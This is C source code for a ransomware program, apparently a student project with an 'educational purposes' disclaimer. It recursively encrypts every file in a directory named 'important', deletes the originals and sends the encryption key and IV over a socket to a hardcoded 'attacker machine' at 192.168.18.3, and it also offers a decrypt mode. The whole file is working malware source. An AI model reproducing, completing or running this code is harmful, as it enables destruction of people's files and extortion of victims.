#include "ransomlib.h"
#include <dirent.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/rand.h>
#include <stdio.h>
#define PORT 8080

// when the programme is launched this function will help us to choose what we want to do
void usage();

// to be able to verify if the file is encrypted or not
int is_encrypted(char *filename);

// this function is used to help list everything in the repository
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

// generate the key and the corresponding IV
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv);

// send the key and the iv to the hacker machine through the socket
void send_key(char *pKey, char *pIv);

void check_arguments(int argc, char *argv[], int sizeKey, unsigned char *key, char *pKey, int sizeIv, unsigned char *iv, char *pIv);

int main(int argc, char *argv[])
{
	if (argc < 2)
	{
		usage();
		exit(EXIT_FAILURE);
	}
	unsigned char key[33];
	int sizeKey = 33;
	unsigned char iv[33];
	int sizeIv = 33;
	char pKey[65];
	char pIv[65];
	check_arguments(argc, argv, sizeKey, key, pKey, sizeIv, iv, pIv);

	return 0;
}

void usage()
{
	printf("### This program is called ransom, developed by Mariam & Daniella\n");
	printf("You are only allowed to use this code for educational purposes\n");
	printf("This program allow you to use three options:\n");
	printf("\t\t-e\tTo Encrypt \n");
	printf("\t\t-d\tTo Decrypt (specify key and iv)\n");
	printf("\t\t-h\tfor help\n");
}

int is_encrypted(char *filename)
{
	char *token = strtok(filename, ".");

	while (token != NULL)
	{
		// if the file have at the end Pwnd it means that it's encrypted
		if (strcmp(token, "Pwnd") == 0)
		{
			return 1;
		}
		token = strtok(NULL, ".");
	}
	return 0;
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv)
{
	printf("Generating keys..\n");
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeKey);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	if (de_flag == 'e')
		printf("Encrypting...\n");
	else if (de_flag == 'd')
		printf("Decrypting...\n");
	DIR *dp = opendir(name);
	if (dp == NULL)
	{
		puts("Cannot find directory!!");
		exit(EXIT_FAILURE);
	}
	struct dirent *dirp;

	while ((dirp = readdir(dp)) != NULL)
	{
		if (dirp->d_type == DT_DIR && strcmp("..", dirp->d_name) != 0 && strcmp(".", dirp->d_name) != 0)
		{
			char *newPath = (char *)malloc(strlen(name) + strlen(dirp->d_name) + 2);
			strcpy(newPath, name);
			strncat(newPath, "/", 2);
			strncat(newPath, dirp->d_name, strlen(dirp->d_name));
			listdir(newPath, iv, key, de_flag);
			free(newPath);
		}

		else if (strcmp("..", dirp->d_name) != 0 && strcmp(".", dirp->d_name) != 0)
		{
			char *filePath = (char *)malloc(strlen(name) + strlen(dirp->d_name) + 2);
			strcpy(filePath, name);
			strncat(filePath, "/", 2);
			strncat(filePath, dirp->d_name, strlen(dirp->d_name));
			printf("%s\n", filePath);
			if (de_flag == 'e')
				encrypt(key, iv, filePath);
			else if (de_flag == 'd')
				decrypt(key, iv, filePath);
			remove(filePath);
			free(filePath);
		}
	}
}

void send_key(char *pKey, char *pIv)
{
	puts("Sending keys...");
	int sock = 0, valread;
	struct sockaddr_in serv_addr;
	char msg[1024];
	snprintf(msg, sizeof(msg), "key = %s\nIv = %s", pKey, pIv);
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("Socket creation error");
		exit(EXIT_FAILURE);
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);

	// Convert IPv4 and IPv6 addresses from text to binary form
	// the 192.168.18.3 is the ip for the attacker machine
	if (inet_pton(AF_INET, "192.168.18.3", &serv_addr.sin_addr) <= 0)
	{
		perror("Invalid IP address!!!");
		exit(EXIT_FAILURE);
	}

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
		perror("Connection Failed ");
		exit(EXIT_FAILURE);
	}
	send(sock, msg, strlen(msg), 0);
	puts("Keys sent!");
}

void check_arguments(int argc, char *argv[], int sizeKey, unsigned char *key, char *pKey, int sizeIv, unsigned char *iv, char *pIv)
{
	if (!strcmp(argv[1], "-h"))
	{
		usage();
	}

	else if (!strcmp(argv[1], "-e"))
	{
		generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
		listdir("important", iv, key, 'e');
		send_key(pKey, pIv);
	}

	else if (!strcmp(argv[1], "-d") && argc == 4)
	{
		strcpy(pKey, argv[2]);
		strcpy(pIv, argv[3]);
		hexa_to_bytes(pKey, key, sizeKey);
		hexa_to_bytes(pIv, iv, sizeIv);
		listdir("important", iv, key, 'd');
	}

	else
	{
		puts("Bad choice!");
		exit(EXIT_FAILURE);
	}
}
